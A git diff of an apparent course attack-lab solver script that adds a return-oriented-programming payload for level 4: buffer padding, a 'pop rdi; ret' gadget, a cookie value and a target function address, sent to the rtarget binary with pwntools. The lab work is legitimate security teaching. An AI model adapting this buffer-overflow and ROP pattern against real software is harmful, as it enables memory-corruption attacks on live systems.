@@ -43,6 +43,15 @@ def solve_ctarget(solution: bytes, flag: bool, level: int) -> None:
     proc = process(['./ctarget', '-q'])
     proc.sendline(solution)
     proc.interactive()
+
+def solve_rtarget(solution: bytes, flag: bool, level: int) -> None:
+    if flag:
+        print_solution(level, solution)
+        return
+    
+    proc = process(['./rtarget', '-q'])
+    proc.sendline(solution)
+    proc.interactive()
         
 def solve_level_1(flag: bool) -> None:
     solution = (
@@ -72,7 +81,13 @@ def solve_level_3(flag: bool) -> None:
     solve_ctarget(solution, flag, 3)
 
 def solve_level_4(flag: bool) -> None:
-    pass
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x402a10) # pop rdi; ret
+        + p64(COOKIE) # cookie value
+        + p64(0x401828) # touch 2
+    )
+    solve_rtarget(solution, flag, 4)
 
 def solve_level_5(flag: bool) -> None:
     pass
@@ -81,7 +96,6 @@ def solve_level_5(flag: bool) -> None:
 @click.option("--level", "-l", help="level to solve", required=True, type=int)
 @click.option("--output", "-o", is_flag=True, help="print the solution instead of executing it", type=bool, default=False)
 def main(level: int, output: bool):
-    print(level, output)
     if not check_level(level):
         click.echo(f"Invalid level: {level}")
         return
